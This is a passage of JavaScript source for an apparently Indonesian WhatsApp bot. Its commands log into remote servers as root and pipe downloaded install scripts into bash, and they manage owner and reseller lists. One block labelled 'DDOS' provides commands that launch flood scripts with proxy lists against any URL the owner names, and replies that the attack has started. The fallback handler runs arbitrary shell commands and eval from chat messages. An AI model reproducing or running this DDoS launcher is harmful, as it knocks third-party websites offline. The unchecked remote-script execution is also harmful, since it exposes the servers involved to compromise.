// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "installtemaelysium": 
case "instaltemaelysium": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!text || !text.includes("|")) return hereply(example("ipvps|pwvps"));

    const [ipvps, passwd] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd) return hereply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        hereply("Memproses install *tema elysium* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");

        ress.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async () => {    
                await hereply("Berhasil install *tema elysium* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write(`11\n`);
                stream.write(`yes\n`);
                stream.write(`x\n`);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        hereply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "installdepend": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!text || !text.includes("|")) return hereply(example("ipvps|pwvps"));

    const [ipvps, passwd] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd) return hereply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/KiwamiXq1031/installer-premium/refs/heads/main/zero.sh)`
    const ress = new Client();

    ress.on('ready', async () => {
        hereply("Memproses install *depend* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");

        ress.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async () => {    
                const buttonsMessage = {
                    text: `Berhasil install *depend* pterodactyl ✅\nKlik Tombol Di Bawah Untuk Install Tema Nebula.`,
                    footer: `*${botname}*`,
                    buttons: [
                        { buttonId: `${prefix}installtemanebula ${text}`, buttonText: { displayText: 'Install Tema Nebula' }, type: 1 }
                    ],
                    headerType: 1,
                    viewOnce: true,
                    contextInfo: {
                        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
                    }
                };

                await linux.sendMessage(m.chat, buttonsMessage, { quoted: m });
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write(`11\n`);
                stream.write(`A\n`);
                stream.write(`Y\n`);
                stream.write(`Y\n`);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        hereply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;

// ≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡≡ //

case "installtemanebula": 
case "instaltemanebula": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (!text || !text.includes("|")) return hereply(example("ipvps|pwvps"));

    const [ipvps, passwd] = text.split("|").map(item => item.trim());
    if (!ipvps || !passwd) return hereply(example("ipvps|pwvps"));

    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };

    const command = `bash <(curl -s https://raw.githubusercontent.com/Bangsano/Autoinstaller-Theme-Pterodactyl/refs/heads/main/install.sh)`;
    const ress = new Client();

    ress.on('ready', async () => {
        hereply("Memproses install *tema nebula* pterodactyl\nTunggu 3 menit ke depan hingga proses selesai...");

        ress.exec(command, (err, stream) => {
            if (err) throw err;
            
            stream.on('close', async () => {    
                await hereply("Berhasil install *tema nebula* pterodactyl ✅");
                ress.end();
            }).on('data', async (data) => {
                console.log(data.toString());
                stream.write(`10\n`);
                stream.write(`\n`);
                stream.write(`\n`);
                stream.write(`x\n`);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).on('error', (err) => {
        console.log('Connection Error: ' + err);
        hereply('Katasandi atau IP tidak valid.');
    }).connect(connSettings);
}
break;
        
case "public": 
case "self": {
    if (!isCreator && !isPremium) return hereply(mess.premium)
    if (command === "public") {
        linux.public = true;
        await hereply("✅ *Berhasil Mengganti Mode*\nMode Bot Beralih Ke *Public*.");
    } else if (command === "self") {
        linux.public = false;
        await hereply("✅ *Berhasil Mengganti Mode*\nMode Bot Beralih Ke *Self*.");
    }
}
break;        
        
case "addown": case "addowner": {
    if (!isCreator) return hereply(mess.owner);
    if (!m.quoted && !text) return hereply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/owner.json";
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([])); // Jika file tidak ada, buat file kosong
    }

    let owners = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || owners.includes(input) || input === botNumber) {
        return hereply(`⚠️ *Nomor ${input2} sudah menjadi owner bot!*`);
    }

    owners.push(input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    hereply(`🚀 Selamat! Anda sekarang menjadi Owner Vps!

✨ Keuntungan yang Anda dapatkan:
🔹 Akses Create vps
🔹 Bisa menjual Vps
🔹 Mendapat hak istimewa sebagai Owner 🚀

🔥 Gunakan kesempatan ini sebaik mungkin & selamat berbisnis!`
    );
}
break;        
        
 case "delown": case "delowner": {
    if (!isCreator) return hereply(mess.ownwr);
    if (!m.quoted && !text) return hereply(example("*6285xxx atau reply pesan owner!*"));

    const filePath = "./library/database/owner.json";
    if (!fs.existsSync(filePath)) return hereply("⚠️ *Belum ada owner tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));

    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (input2 === global.owner || input === botNumber) return hereply("⚠️ *Tidak dapat menghapus owner utama!*");
    if (!owners.includes(input)) return hereply(`⚠️ *Nomor ${input2} bukan owner bot!*`);

    owners = owners.filter(owner => owner !== input);
    fs.writeFileSync(filePath, JSON.stringify(owners, null, 2));

    hereply(`✅ *Berhasil menghapus owner ${input2}!*`);
}
break;

case "listowner":       
case "listown": {
    const filePath = "./library/database/owner.json";
    if (!fs.existsSync(filePath)) return m.reply("⚠️ *Belum ada owner tambahan!*");

    let owners = JSON.parse(fs.readFileSync(filePath));
    if (owners.length < 1) return m.reply("⚠️ *Belum ada owner tambahan!*");

    let teks = `\n*🔰 List Owner Tambahan 🔰*\n`;
    for (let i of owners) {
        teks += `\n➤ *${i.split("@")[0]}* \n📌 *Tag:* @${i.split("@")[0]}\n`;
    }

    linux.sendMessage(m.chat, { text: teks, mentions: owners }, { quoted: fkontak });
}
break; 
        
case "addressvps": 
case "addreselervps": {
    if (!isCreator) return hereply(mess.owner); // Hanya pemilik yang bisa menambahkan premium
    if (!m.quoted && !text) return hereply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/premium.json";
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify([])); // Buat file jika belum ada
    }

    let premiums = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (premiums.includes(input)) {
        return hereply(`⚠️ *Nomor ${input2} sudah terdaftar sebagai pengguna Reseler Vps!*`);
    }

    premiums.push(input);
    fs.writeFileSync(filePath, JSON.stringify(premiums, null, 2));

    hereply(`💎 Selamat! Nomor ${input2} sekarang telah menjadi *Pengguna Reseler Vps*.

✨ Keuntungan Reseler Vps:
🔹 Akses fitur eksklusif
🔹 Prioritas layanan
🔹 Update lebih cepat

🔥 Gunakan fitur Reseler Vps dengan bijak!`);
}
break;
        
case "delressvps":
case "delreselervps": {
    if (!isCreator) return hereply(mess.owner); // hanya owner utama
    if (!m.quoted && !text) return hereply(example("*6285xxx atau reply pesan pengguna!*"));

    const filePath = "./library/database/premium.json";
    if (!fs.existsSync(filePath)) return hereply("⚠️ *Belum ada pengguna Reseler Vps!*");

    let premiums = JSON.parse(fs.readFileSync(filePath));
    const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const input2 = input.split("@")[0];

    if (!premiums.includes(input)) {
        return hereply(`⚠️ *Nomor ${input2} bukan pengguna Reseler Vps!*`);
    }

    premiums = premiums.filter(p => p !== input);
    fs.writeFileSync(filePath, JSON.stringify(premiums, null, 2));

    hereply(`✅ *Berhasil menghapus Reseler Vps untuk ${input2}!*`);
}
break;        
        
case "listressvps":
case "listreselervps": {
    const filePath = "./library/database/premium.json";
    if (!fs.existsSync(filePath)) return m.reply("⚠️ *Belum ada pengguna Reseler Vps!*");

    let premiums = JSON.parse(fs.readFileSync(filePath));
    if (premiums.length < 1) return m.reply("⚠️ *Belum ada pengguna Reseler Vps!*");

    let teks = `\n☁ *List Pengguna Reseler Vps* ☁\n`;
    for (let i of premiums) {
        teks += `\n➤ *${i.split("@")[0]}* \n📌 *Tag:* @${i.split("@")[0]}\n`;
    }

    linux.sendMessage(m.chat, { text: teks, mentions: premiums }, { quoted: fkontak });
}
break;        
 
///DODDIE DDOS			
case 'floods': {
				if (!isCreator) return hereply(mess.owner)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					hereply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/floods.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					hereply(`Format Pesan Tidak Benar. Gunakan Format : Floods [Url] [Time] [Thread] [Rate]`)
				}
			}
			break		
			
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																		
case 'ua': {
				if (!isCreator) return hereply(mess.owner)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					hereply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/kilua.js ${url} ${time} ${thread} proxy.txt ${rate} ua.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					hereply(`Format Pesan Tidak Benar. Gunakan Format : Ua [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'xchrome': {
				if (!isCreator) return hereply(mess.owner)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					hereply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/chromev3.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					hereply(`Format Pesan Tidak Benar. Gunakan Format Xchrome [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'tls': {
				if (!isCreator) return hereply(mess.owner)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					hereply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/tls-arz.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					hereply(`Format Pesan Tidak Benar. Gunakan Format Tls [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'tlsbypass': {
				if (!isCreator) return hereply(mess.owner)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					hereply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/tls-bypass.js ${url} ${time} ${rate} ${thread}`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					hereply(`Format Pesan Tidak Benar. Gunakan Format Tlsbypass [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'tlsv2': {
				if (!isCreator) return hereply(mess.owner)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					hereply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/tls.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					hereply(`Format Pesan Tidak Benar. Gunakan Format Tlsv2 [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'bypass-cf': {
				if (!isCreator) return hereply(mess.owner)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					hereply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/bypass.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					hereply(`Format Pesan Tidak Benar. Gunakan Format : Bypass-cf [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
			case 'tls-vip': {
				if (!isCreator) return hereply(mess.owner)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					hereply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/tlsvip.js ${url} ${time} ${rate} ${thread} proxy.txt`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					hereply(`Format Pesan Tidak Benar. Gunakan Format Tls-vip [Url] [Time] [Thread] [Rate]`)
				}
			}
			break
case 'mix': {
				if (!isCreator) return hereply(mess.owner)
				let url = q.split(" ")[0]
				let time = q.split(" ")[1]
				let thread = q.split(" ")[2]
				let rate = q.split(" ")[3]
				if (args.length === 4 && url && time && thread && rate) {
					hereply(`Serangan DDoS Telah Dieksekusi Ke Situs Web Yang Dituju : ${url} 🎭 Serangan Berlangsung Selama ${time} Detik.`);
					exec(`node ./system/ddos/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
						if (err) return console.log(err.toString())
						if (stdout) return console.log(util.format(stdout))
					})
				} else {
					hereply(`Format Pesan Tidak Benar. Gunakan Format : Mix [Url] [Time] [Thread] [Rate]`)
				}
			}
			break	
//////jadikan                
// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

default:
if ((m.text).startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if(err) return linux.sendMessage(m.chat, {text: err.toString()}, {quoted: m})
if (stdout) return linux.sendMessage(m.chat, {text: util.format(stdout)}, {quoted: m})
})}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith("=>")) {
if (!isCreator) return
try {
const evaling = await eval(`;(async () => { ${text} })();`);
return linux.sendMessage(m.chat, {text: util.format(evaling)}, {quoted: m})
} catch (e) {
return linux.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

if ((m.text).startsWith(">")) {
if (!isCreator) return
try {
let evaled = await eval(text)
if (typeof evaled !== 'string') evaled = util.inspect(evaled)
linux.sendMessage(m.chat, {text: util.format(evaled)}, {quoted: m})
} catch (e) {
linux.sendMessage(m.chat, {text: util.format(e)}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

}} catch (e) {
console.log(e)
linux.sendMessage(`${owner}@s.whatsapp.net`, {text:`${util.format(e)}`}, {quoted: m})
}}

// >~~~~~~~~~~~~~~~~~~~~~~~~~~~~< //

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})

let file = require.resolve(__filename) 
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.cyan("File Update => "),
chalk.cyan.bgBlue.bold(`${__filename}`))
delete require.cache[file]
require(file)
})